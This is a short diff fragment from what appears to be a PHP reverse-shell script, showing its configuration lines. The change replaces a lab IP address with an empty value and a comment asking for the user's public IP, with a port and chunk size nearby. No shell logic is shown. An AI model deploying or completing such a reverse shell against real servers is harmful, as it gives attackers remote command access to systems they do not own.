@@ -46,7 +46,7 @@
 
 set_time_limit (0);
 $VERSION = "1.0";
-$ip = '192.168.32.129';  // CHANGE THIS
+$ip = '';  // CHANGE THIS TO YOUR PUBLIC IP
 $port = 1234;       // CHANGE THIS
 $chunk_size = 1400;
 $write_a = null;
